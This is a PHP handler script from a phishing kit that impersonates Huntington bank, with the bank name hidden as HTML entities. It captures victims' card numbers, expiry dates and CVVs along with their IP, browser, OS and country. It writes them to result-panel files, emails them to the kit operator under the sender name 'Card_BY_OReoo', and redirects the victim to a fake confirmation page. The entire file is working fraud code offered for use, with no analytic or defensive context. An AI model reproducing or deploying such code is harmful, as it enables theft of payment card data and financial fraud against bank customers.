<?php
@session_start();
@error_reporting(0);
include("./country.php");
include("./os.php");
$InfoDATE   = date("d-m-Y h:i:sa");
$OS = getOS($_SERVER['HTTP_USER_AGENT']);
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);
$_SESSION['browser'] = $browserTy_Version = array_pop($browser); 
$ip = $_SERVER['REMOTE_ADDR'];


$Card = $_SESSION['Card'] = $_POST['Card'] ;
$EXP = $_SESSION['EXP'] = $_POST['EXP'] ;
$CVV = $_SESSION['CVV'] = $_POST['CVV'] ;


$messege = '<h3 style="font-weight: 400; margin: 10px 0; font-size: 24px;color: #69BE2E">
&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#67;&#97;&#114;&#100;
</h3>
<HR>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">Card Number : '.$_SESSION["Card"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">EXP : '.$_SESSION["EXP"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">CVV : '.$_SESSION["CVV"].' </h2>
<HR>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">system : '.$OS.' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">browser : '.$browserTy_Version.' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">ip address : '.$_SERVER["REMOTE_ADDR"].' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">country : '.$country.' </h2>
<h2 style="font-weight: 400; margin: 10px 0;color: #69BE2E">date time : '.$InfoDATE.' </h2>
<HR>
';


include("../config.php"); 
$f = fopen("../Result_Panel.php", "a");fwrite($f, $messege);
$ff = fopen("../../All_Result_Panel.php", "a");fwrite($ff, $messege);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Huntington Card [".$_SERVER['REMOTE_ADDR']."] ";
$headers .= "From: Card_BY_OReoo" . "\r\n";
mail($yourmail, $subject, $messege, $headers);
header("Location: ../app/Congratulations.php");
?>